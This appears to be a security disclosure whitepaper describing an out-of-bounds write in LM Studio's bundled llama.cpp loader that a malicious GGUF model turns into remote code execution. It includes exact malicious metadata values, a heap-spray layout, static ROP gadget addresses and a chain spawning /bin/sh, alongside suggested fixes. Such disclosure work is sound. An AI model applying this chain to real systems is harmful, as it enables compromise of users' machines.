# LM Studio — Out-of-Bounds Write in `llama_hparams::set_swa_pattern` Leading to Remote Code Execution via Malicious GGUF Model

**Authors:** Alessandro Mizzaro <@Alemmi>, Mario Del Gaudio <@hdesk>

---

## 1. Target

| Item | Value |
| --- | --- |
| Product | LM Studio (desktop application, `headless` / API server mode) |
| Affected platform | Linux x86_64 |
| Inference backend | `llama.cpp` bundled in the LM Studio engine package (`llm-engine`) and loaded by the LM Studio Node-based runtime |
| Vulnerable function | `llama_hparams::set_swa_pattern` (`src/llama-hparams.cpp`) |
| Triggering input | A user-supplied GGUF model file whose `general.architecture` is `gemma3` (any architecture branch that calls `set_swa_pattern` is reachable; we exercise `gemma3` because it is enabled by default and accepted by the LM Studio model loader without extra opt-in) |
| Reachable from | The LM Studio model loading path: GUI drag-and-drop, the local OpenAI-compatible HTTP server when model loading is enabled, or the LM Studio daemon WebSocket RPC. No prior code execution is required, and the attack is purely content-based. |

The static gadget addresses given in this document refer to the non-PIE engine binary shipped by LM Studio at the time of the entry. They are reproduced here only to make the exploit chain unambiguous; the underlying vulnerability is independent of those addresses.

---

## 2. CWE Classification

The entry chains one primary memory-corruption vulnerability with several downstream consequences enabled by it. The CWE assignment is:

- **Primary — [CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html).** The loop in `llama_hparams::set_swa_pattern` writes `swa_layers[il]` for `il ∈ [0, n_layer)` while `swa_layers` has fixed size `LLAMA_MAX_LAYERS = 512`, with `n_layer` taken verbatim from the GGUF metadata. Any value `n_layer > 512` produces a heap-relative out-of-bounds write of attacker-shaped 32-bit values past the array.
- **Contributing — [CWE-129: Improper Validation of Array Index](https://cwe.mitre.org/data/definitions/129.html).** `n_layer` is read at `src/llama-model.cpp:373` with no upper-bound check against `LLAMA_MAX_LAYERS`, even though an analogous assertion `GGML_ASSERT(hparams.n_expert <= LLAMA_MAX_EXPERTS)` exists for `n_expert` a few lines below.
- **Contributing — [CWE-1284: Improper Validation of Specified Quantity in Input](https://cwe.mitre.org/data/definitions/1284.html).** The 32-bit `block_count` value is consumed from an untrusted file without any sanity bound on the count.
- **Chained / downstream — [CWE-822: Untrusted Pointer Dereference](https://cwe.mitre.org/data/definitions/822.html).** Once `llama_vocab::pimpl` (a `std::unique_ptr` adjacent to `swa_layers` in `llama_model`) has been overwritten with an attacker-chosen value, every later access through `pimpl` is a dereference of an untrusted pointer.

---

## 3. Preconditions

The full chain runs at **GGUF parse time**; no special user interaction beyond model load is required. The preconditions are:

1. **Reachability of the model loader.** LM Studio is reached either through (a) the local OpenAI-compatible API server with model loading enabled, (b) the LM Studio daemon WebSocket RPC (the path used by the supplied PoC client), or (c) a user manually loading the malicious `.gguf`. All three paths reach `llama_model::load_hparams` with attacker-controlled metadata.
2. **Linux x86_64 LM Studio engine.** The exploit is developed against the bundled non-PIE engine binary; gadget addresses are static (Section 6).
3. **Heap layout assumption.** The exploitation step targets the constant heap address `0x100000001`, which falls inside the predictable Linux x86_64 large-allocation range used by glibc `malloc`/`mmap`. We cover ~4 GB of that range by a periodic 14-slot heap spray of GGUF KV strings. The stable-by-construction success rate of the spray is `1/14 ≈ 7 %` per single load attempt, and the model-load operation is fully repeatable without restarting LM Studio.
4. **No additional vulnerability or sandbox escape is required.** The whole chain — corruption, controlled abort, destructor-driven hijack and ROP — is reached during a single GGUF parse.

---

## 4. Vulnerability Mechanism (Code Listings)

All listings below are verbatim from the `llama.cpp` source tree as bundled with the targeted LM Studio build. Line numbers match the upstream source files. Comments inside the listings starting with `// [VULN]`, `// [SINK]`, `// [REACH]`, etc. are the contestants' annotations highlighting the vulnerability mechanism.

### 4.1. Root cause: `set_swa_pattern` writes past `swa_layers`

```cpp
// File: src/llama-hparams.cpp

  1 #include "llama-hparams.h"
  2
  3 #include "ggml.h"
  4
  5 #include <algorithm>
  6 #include <cassert>
  7
  8 void llama_hparams::set_swa_pattern(uint32_t n_pattern, bool dense_first) {
  9     if (dense_first) {
 10         for (uint32_t il = 0; il < n_layer; ++il) {                    // [VULN] loop bound is attacker-controlled n_layer
 11             swa_layers[il] = n_pattern == 0 || (il % n_pattern != 0);  // [SINK] OOB write when il >= LLAMA_MAX_LAYERS
 12         }
 13     } else {
 14         for (uint32_t il = 0; il < n_layer; ++il) {                    // [VULN] same OOB primitive (default branch for gemma3)
 15             swa_layers[il] = n_pattern == 0 || (il % n_pattern < (n_pattern - 1));
 16         }
 17     }
 18 }
```

`swa_layers` is declared in `llama-hparams.h` as a fixed-size array:

```cpp
// File: src/llama-hparams.h

  9 #define LLAMA_MAX_LAYERS  512
 ...
130     // Sliding Window Attention (SWA)
131     llama_swa_type swa_type = LLAMA_SWA_TYPE_NONE;
132     // the size of the sliding window (0 - no SWA)
133     uint32_t n_swa = 0;
134     // if swa_layers[il] == 1, then layer il is SWA
135     // if swa_layers[il] == 0, then layer il is dense (i.e. non-SWA)
136     // by default, all layers are dense
137     // note: using uint32_t type for compatibility reason
138     std::array<uint32_t, LLAMA_MAX_LAYERS> swa_layers;   // [VULN] capacity = 512 * 4 = 2048 bytes — much smaller than n_layer can grow
```

Because `n_layer` is a 32-bit value taken straight from the file with no validation, the loop at lines 10/14 can iterate up to `2^32 - 1` times, producing up to ~16 GB of out-of-bounds writes; we only need a few KB.

### 4.2. `n_layer` is read from the GGUF without an upper bound

```cpp
// File: src/llama-model.cpp – llama_model::load_hparams (excerpt)

365     // for CLIP models, we only need to load tensors, no hparams
366     if (hparams.vocab_only || ml.get_arch() == LLM_ARCH_CLIP) {
367         return;
368     }
369
370     ml.get_key(LLM_KV_CONTEXT_LENGTH,          hparams.n_ctx_train);
371     ml.get_key(LLM_KV_EMBEDDING_LENGTH,        hparams.n_embd);
372     ml.get_key(LLM_KV_EMBEDDING_LENGTH_OUT,    hparams.n_embd_out_impl, false);
373     ml.get_key(LLM_KV_BLOCK_COUNT,             hparams.n_layer);     // [VULN] attacker-controlled u32 — no clamp
374     ml.get_key(LLM_KV_EXPERT_COUNT,            hparams.n_expert,        false);
 ...
390     GGML_ASSERT(hparams.n_expert <= LLAMA_MAX_EXPERTS);              // [REACH] bounds check exists for n_expert ...
391     GGML_ASSERT(hparams.n_expert_used <= hparams.n_expert);          // [REACH] ... but NOT for n_layer above
```

### 4.3. The `gemma3` branch reaches `set_swa_pattern`

```cpp
// File: src/llama-model.cpp – LLM_ARCH_GEMMA3 hparams (excerpt)

1225        case LLM_ARCH_GEMMA3:
1226            {
1227                const bool found_swa = ml.get_key(LLM_KV_ATTENTION_SLIDING_WINDOW, hparams.n_swa, false);
1228                if (found_swa && hparams.n_swa > 0) {                                // [REACH] enabled by setting gemma3.attention.sliding_window
1229                    hparams.swa_type = LLAMA_SWA_TYPE_STANDARD;
1230                    uint32_t swa_period = 6;
1231                    ml.get_key_or_arr(LLM_KV_ATTENTION_SLIDING_WINDOW_PATTERN, swa_period, false);
1232                    hparams.set_swa_pattern(swa_period);                              // [REACH] reaches the vulnerable loop
1233
1234                    ml.get_key(LLM_KV_ROPE_FREQ_BASE_SWA, hparams.rope_freq_base_train_swa, false);
1235                } else {
1236                    hparams.swa_type = LLAMA_SWA_TYPE_NONE;
1237                }
 ...
1257            } break;
```

By emitting `gemma3.attention.sliding_window = 4096` and `gemma3.block_count = 3852`, the attacker drives the vulnerable loop to perform `3852 - 512 = 3340` 32-bit OOB writes immediately after `swa_layers`. The values written are `0` or `1` according to `il % swa_period`, so the attacker has full byte-stride control over the OOB pattern via `swa_period`.

### 4.4. Adjacent target: `llama_vocab::pimpl`

```cpp
// File: src/llama-model.h (excerpt)

474 struct llama_model {
475     llm_type type = LLM_TYPE_UNKNOWN;
476     llm_arch arch = LLM_ARCH_UNKNOWN;
477
478     std::string name = "n/a";
479
480     llama_hparams hparams = {};                            // [VULN] contains swa_layers — source of the OOB write
481     llama_vocab   vocab;                                   // [SINK] lives immediately after hparams — first interesting victim
 ...
534     std::unordered_set<llama_adapter_lora *> loras;        // [SINK] further into the OOB range — used by the destructor
 ...
539     explicit llama_model(const struct llama_model_params & params);
540     ~llama_model();
```

```cpp
// File: src/llama-vocab.h (excerpt)

 66 struct llama_vocab {
 ...
182     void print_info() const;
183
184 private:
185     struct impl;
186     std::unique_ptr<impl> pimpl;     // [SINK] single 8-byte pointer field — the only state of llama_vocab
187 };
```

Because `llama_vocab` is a thin pointer-only wrapper, the byte offset of `vocab.pimpl` from the start of `swa_layers` is a constant. Two consecutive OOB writes of the value `1` (the SWA-pattern bit for layers that are *not* aligned to `swa_period`) land exactly on the 8 bytes of `vocab.pimpl`, replacing the legitimate `unique_ptr` with the attacker-chosen value `0x0000000100000001` — a concrete heap address selected because it falls inside the page covered by the spray (Section 5). With `n_layer = 3852` and `swa_period = 6` the offsets line up cleanly without any further tuning.

### 4.5. The exception path used to weaponise the corruption

The `t5` tokenizer branch loads our user-controlled `precompiled_charsmap` blob *before* the loader checks that the token list exists:

```cpp
// File: src/llama-vocab.cpp – impl::load (excerpt)

1816        } else if (tokenizer_model == "t5") {                                           // [REACH] selected by tokenizer.ggml.model = "t5"
1817            type = LLAMA_VOCAB_TYPE_UGM;
 ...
1827            const int precompiled_charsmap_keyidx = gguf_find_key(ctx, kv(LLM_KV_TOKENIZER_PRECOMPILED_CHARSMAP).c_str());
1828            if (precompiled_charsmap_keyidx != -1) {
1829                const gguf_type pc_type = gguf_get_arr_type(ctx, precompiled_charsmap_keyidx);
1830                GGML_ASSERT(pc_type == GGUF_TYPE_INT8 || pc_type == GGUF_TYPE_UINT8);
1831
1832                const size_t n_precompiled_charsmap = gguf_get_arr_n(ctx, precompiled_charsmap_keyidx);
1833                const char * pc = (const char *) gguf_get_arr_data(ctx, precompiled_charsmap_keyidx);
1834                precompiled_charsmap.assign(pc, pc + n_precompiled_charsmap);            // [PLANT] ROP blob is materialised here
 ...
2127        const int token_idx = gguf_find_key(ctx, kv(LLM_KV_TOKENIZER_LIST).c_str());
2128        if (token_idx == -1) {
2129            throw std::runtime_error("cannot find tokenizer vocab in model file\n");     // [TRIGGER] forced abort *after* the blob is planted
2130        }
```

By omitting `tokenizer.ggml.tokens`, the loader throws *after* the ROP-carrying `precompiled_charsmap` blob has been copied into the heap. C++ exception unwinding then runs `~llama_model`:

```cpp
// File: src/llama-model.cpp

329 llama_model::~llama_model() {
330     for (auto * lora : loras) {        // [SINK] iterator walks attacker-shaped bucket pointers
331         delete lora;                   // [SINK] dispatch + operator delete on attacker-controlled pointer
332     }
333 }
```

The same OOB write that corrupted `vocab.pimpl` continues into the `std::unordered_set<llama_adapter_lora *> loras` (declaration order at `llama-model.h:534`), so the iterator yields attacker-shaped `lora *` pointers. `delete lora` runs `~llama_adapter_lora`, which transitively runs the destructor of the `bufs` vector:

```cpp
// File: src/llama-adapter.h (excerpt)

 63 struct llama_adapter_lora {
 64     llama_model * model = nullptr;
 ...
 70     std::vector<ggml_backend_buffer_ptr> bufs;     // [SINK] each unique_ptr deleter calls ggml_backend_buffer_free
 ...
 80     explicit llama_adapter_lora(llama_model * model) : model(model) {}
 81     ~llama_adapter_lora() = default;
```

Each `ggml_backend_buffer_ptr` is a `std::unique_ptr<ggml_backend_buffer, ggml_backend_buffer_deleter>` whose deleter is:

```cpp
// File: ggml/include/ggml-cpp.h

 32 struct ggml_backend_buffer_deleter { void operator()(ggml_backend_buffer_t buffer) { ggml_backend_buffer_free(buffer); } };
 ...
 37 typedef std::unique_ptr<ggml_backend_buffer, ggml_backend_buffer_deleter> ggml_backend_buffer_ptr;
```

with:

```cpp
// File: ggml/src/ggml-backend.cpp

107 void ggml_backend_buffer_free(ggml_backend_buffer_t buffer) {
108     if (buffer == NULL) {                          // [GADGET-1] first call: blob[0] = 0 → returns silently
109         return;
110     }
111
112     if (buffer->iface.free_buffer != NULL) {       // [HIJACK] indirect call through attacker-controlled vtable
113         buffer->iface.free_buffer(buffer);         // [HIJACK] taken from sprayed memory at blob[8] = PIVOT_ADDR
114     }
115     delete buffer;
```

The attacker shapes the corrupted `bufs` vector so that the first iteration receives `NULL` (line 108 short-circuits) and the second iteration receives a buffer whose `iface.free_buffer` resolves, through the heap spray, to a stack-pivot gadget. From this point on the attacker controls `RIP`.

### 4.6. Exploitation primitive summary

The above gives:

- a **zero-prerequisite, attacker-shaped, multi-kilobyte heap-relative out-of-bounds write** (Section 4.1–4.3);
- a **stable target** — the adjacent `llama_vocab::pimpl` and `llama_model::loras` — whose offsets are constant in every build (Section 4.4);
- a **one-shot code-execution sink** — the indirect call at `ggml-backend.cpp:113` reached during exception unwinding (Section 4.5).

---

## 5. Heap Spray

Because LM Studio's engine process is non-PIE, every gadget address used during ROP is fixed (Section 6); the only address the attacker still has to *predict* is the heap address pointed to by the corrupted `vocab.pimpl`. We avoid that prediction by making it *true by saturation*: a heap spray of GGUF KV strings covers ~4 GB of the heap with a periodic 14-slot pattern.

| Parameter | Value | Notes |
| --- | --- | --- |
| Spray target address | `0x100000001` | Inside the predictable Linux x86_64 large-allocation range. |
| Spray size | ~4 GB | Roughly 64,000 GGUF string KVs of 65,504 bytes each. |
| Pattern period `N` | 14 slots × 8 bytes | Each ~64 KiB string carries the same 14-slot pattern repeated, with rotation. |
| Single-shot success | `1/14 ≈ 7 %` | Verified against the production engine; LM Studio re-loads the model on demand, so retrying is free. |

The 14 slots collectively encode, at fixed offsets relative to `0x100000001`:

- the two pointers consumed by the destructor walk (`NULL`, then a stack-pivot gadget address);
- the four-entry `argv` array passed to `execvp`;
- the literal `/bin/sh\0`;
- filler entries chosen so that any `std::string`-shaped cells the destructor inspects pass minimal sanity (length and capacity look plausible).

GGUF strings are written as `UINT8` arrays for the ROP blob so that **embedded null bytes survive intact** — this is essential because most gadget addresses contain zero bytes that would otherwise terminate a C-string parse.

---

## 6. Exploitation Steps

The PoC is a single Python script (`exploit.py`) that emits a ~4 GB malicious `.gguf` file. Loading the file in LM Studio runs the entire chain.

### Step 1 — corrupt `vocab.pimpl`

The GGUF declares:

- `general.architecture = "gemma3"` — selects the GEMMA3 branch in `load_hparams` (Section 4.3).
- `gemma3.block_count = 3852` — drives `n_layer` to a value that overflows `swa_layers` (Section 4.1).
- `gemma3.attention.sliding_window = 4096` — enables the `set_swa_pattern` call.
- `gemma3.embedding_length = 256`, `gemma3.context_length = 8192`, `gemma3.attention.layer_norm_rms_epsilon = 1e-6` — only there to satisfy the loader.

`set_swa_pattern` writes `4 × 3852 = 15408` bytes into the 2048-byte `swa_layers` array; the two writes that fall on `vocab.pimpl` produce `0x0000000100000001`.

### Step 2 — heap spray

The loader is then forced to ingest ~64,000 KVs whose names are `s.000000`, `s.000001`, … and whose values are 65,504-byte strings carrying the 14-slot pattern of Section 5. After this, `0x100000001 + k * 8` for `k ∈ [0, 14)` holds attacker-controlled values with overwhelming probability.

### Step 3 — plant the ROP blob

The KV `tokenizer.ggml.precompiled_charsmap` (declared as `UINT8` array) carries the ROP payload. Its layout is:

| Offset | Value | Purpose |
| --- | --- | --- |
| `0` | `0` | Consumed by the first `ggml_backend_buffer_free` — short-circuited by the `NULL` check at `ggml-backend.cpp:108`. |
| `8` | `PIVOT` (`0x236f81c`) | Consumed by the second `ggml_backend_buffer_free` — reaches the indirect call at `ggml-backend.cpp:113`, which lands on `pop rsi; pop rsp; pop rbx; pop r14; pop rbp; ret`. |
| `16` / `24` | junk | Eaten by the gadget's `pop r14` / `pop rbp`. |
| `32 …` | ROP chain | See below. |
| `160 …` | Command string | Raw NUL-terminated bytes of the final `/bin/sh -c` argument. |

### Step 4 — controlled abort

`tokenizer.ggml.model = "t5"` selects the `LLAMA_VOCAB_TYPE_UGM` branch, which loads our `precompiled_charsmap` blob; `tokenizer.ggml.tokens` is *omitted*, so the loader hits `llama-vocab.cpp:2129` and throws `std::runtime_error`. Stack unwinding reaches `~llama_model`.

### Step 5 — destructor-driven hijack

`~llama_model` iterates the (now corrupted) `loras` set and invokes `delete lora`. The chain of destructors reaches `~llama_adapter_lora::bufs`, which calls `ggml_backend_buffer_free` twice. The first call (blob[0] = 0) returns silently; the second call (blob[8] = `PIVOT`) reaches the indirect call site at `ggml-backend.cpp:113`. Because the buffer pointer was sprayed to the gadget address, control transfers to the stack-pivot gadget.

### Step 6 — ROP

After the pivot, `RSP` points into the ROP blob at offset 32. The chain is:

```
0x76ff10  execvp@plt              ; final call target
0x7ab7f1  pop rdi ; ret
0x7a7ec4  pop rsi ; ret
0x7b6008  pop rax ; ret
0x236f81c pop rsi ; pop rsp ; pop rbx ; pop r14 ; pop rbp ; ret   ; PIVOT
0xb3a978  push rsp ; pop rcx ; ret
0x26a7b27 add rax, rcx ; add rax, 0x12 ; pop rbp ; ret
0x1fca547 mov [rdi], rax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x41c148  ".rodata" pointer to the literal "-c\0" inside the engine binary
```

The chain executes:

```
push rsp ; pop rcx ; ret               ; rcx = address of blob[40]
pop rax ; ret                          ; rax = CMD_OFFSET - 0x34
add rax, rcx ; add rax, 0x12 ; ret     ; rax = &command_string  (self-relative)
pop rdi ; ret                          ; rdi = &spray.argv[2]   (in the spray)
mov [rdi], rax ; ... ; ret             ; spray.argv[2] = &command_string
pop rdi ; ret                          ; rdi = "/bin/sh"        (in the spray)
pop rsi ; ret                          ; rsi = &spray.argv      (in the spray)
call execvp@plt                        ; execvp("/bin/sh", {"/bin/sh", "-c", &cmd, NULL})
```

The four `argv` cells are baked into the spray; only `argv[2]` (the pointer to the command string) is patched at run time by the `mov [rdi], rax` gadget so that the command — which lives inside the ROP blob, as raw text after the gadget chain — is reachable without any pre-existing string at a known address. The literal `"-c\0"` used as `argv[1]` is taken straight from the engine binary's `.rodata`, removing one more spray dependency.

### Step 7 — RCE

`execvp` replaces the LM Studio engine process with `/bin/sh -c "<attacker command>"`. The attacker now has arbitrary command execution under the LM Studio user.

---

## 7. Exploit Techniques (Explanation)

| Technique | Where | Why it is used |
| --- | --- | --- |
| **Heap-relative out-of-bounds write** with attacker-controlled stride and value | `set_swa_pattern` (Section 4.1) | Primary memory-corruption primitive; the only vulnerability strictly required. |
| **Adjacency-based field overwrite** of `llama_vocab::pimpl` | `llama_model` field layout (Section 4.4) | Turns the OOB write into a controlled fake-pointer primitive without needing a separate info-leak. |
| **Heap spray with periodic 14-slot pattern** | GGUF KV string entries (Section 5) | Makes the attacker-chosen address `0x100000001` valid on the heap with stable probability `1/14`; allows the rest of the chain to use a single fixed pointer. |
| **GGUF `UINT8` array used to carry binary data with embedded null bytes** | `tokenizer.ggml.precompiled_charsmap` | Pointer-sized gadget addresses contain null bytes that would be truncated by string types; `UINT8` preserves them. |
| **Exception-driven destructor execution** | Missing `tokenizer.ggml.tokens` (Section 4.5) | Forces the corrupted `~llama_model` and `~llama_adapter_lora` destructors to run *after* the corruption is in place, turning an otherwise quiet OOB write into an immediate hijack. |
| **Stack pivot via `ggml_backend_buffer_free` indirect call** | `ggml-backend.cpp:113` | Provides `RIP` control reusing an already-existing indirect call; no separate corruption of vtable storage is needed. |
| **Static (non-PIE) ROP** | LM Studio engine binary | All gadget addresses are absolute; no info-leak step is required. |
| **Self-relative blob addressing** (`push rsp; pop rcx` + `add rax, rcx`) | ROP chain step 1–3 | Computes `&command_string` from the runtime stack pointer, allowing the command to live inside the ROP blob instead of needing to spray it at a known address. |
| **Run-time `argv[2]` rewrite** (`mov [rdi], rax`) | ROP chain step 4 | Final indirection that wires the freshly computed command pointer into the otherwise statically prepared `argv` cells in the spray. |

---

## 8. Affected Versions and Suggested Remediation

- **Affected:** the `llama.cpp`-derived inference engine bundled with LM Studio at the time of the entry. Concretely, the vulnerability is present in any build that contains:
  - `src/llama-hparams.cpp:8-18` (`set_swa_pattern` with no clamp on `n_layer`), and
  - `src/llama-model.cpp:373` (`ml.get_key(LLM_KV_BLOCK_COUNT, hparams.n_layer)` with no `LLAMA_MAX_LAYERS` assertion).

  Any architecture branch that calls `set_swa_pattern` is reachable: at minimum `gemma2`, `gemma3`, `gemma3n`, and `phi3`-family branches; `gemma3` is what we chose because it is enabled on the default load path.

- **Suggested fix.** Two minimally invasive changes:

  1. Add an assertion / hard-fail at the read site, mirroring the existing one for `n_expert`:

     ```cpp
     // src/llama-model.cpp – right after line 373
     ml.get_key(LLM_KV_BLOCK_COUNT, hparams.n_layer);
     if (hparams.n_layer > LLAMA_MAX_LAYERS) {
         throw std::runtime_error("invalid block_count: exceeds LLAMA_MAX_LAYERS");
     }
     ```

  2. Defence in depth: clamp the loop bound inside `set_swa_pattern` itself so that any *future* unchecked path is contained:

     ```cpp
     // src/llama-hparams.cpp – set_swa_pattern
     const uint32_t n = std::min(n_layer, (uint32_t) LLAMA_MAX_LAYERS);
     for (uint32_t il = 0; il < n; ++il) { /* ... */ }
     ```

  The same audit should be applied to every other `LLAMA_MAX_LAYERS`-sized array that is indexed by `n_layer` (`n_head_arr`, `n_head_kv_arr`, `n_ff_arr`, `recurrent_layer_arr`, `xielu_*`, `swiglu_clamp_*`).

---

*End of whitepaper.*
